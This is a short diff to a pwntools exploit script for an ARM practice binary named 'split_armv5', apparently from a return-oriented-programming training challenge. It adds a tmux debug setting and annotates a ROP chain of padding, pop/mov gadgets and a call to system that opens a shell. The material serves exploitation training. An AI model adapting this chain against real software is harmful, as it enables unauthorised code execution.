@@ -5,6 +5,7 @@ import time
 
 # Set up pwntools for the correct architecture
 elf = context.binary = ELF('split_armv5')
+context(terminal=['tmux', 'split-window', '-h'])
 
 gs='''
 b *pwnme+64
@@ -25,7 +26,6 @@ else:
 
 time.sleep(.5)
 
-
 io.recvuntil(b"> ")
 
 usefulString = elf.symbols["usefulString"]
@@ -37,12 +37,12 @@ log.info(f"{system=:x}")
 log.info(f"{g_popr3=:x}")
 
 PL=0x20*b"A"
-PL+=p32(0)              # Pour fp
-PL+=p32(g_popr3 )
-PL+=p32(usefulString)
-PL+=p32(g_movr0r3 )
-PL+=p32(0)              # Pour fp
-PL+=p32(system)
+PL+=p32(0)              # for pop fp
+PL+=p32(g_popr3 )       # pop {r3,pc}; pop {fp, pc}
+PL+=p32(usefulString)   #   => r3 
+PL+=p32(g_movr0r3 )     #   => pc 
+PL+=p32(0)              #        => fp
+PL+=p32(system)         #        => pc
 io.sendline(PL)
 io.interactive()
 
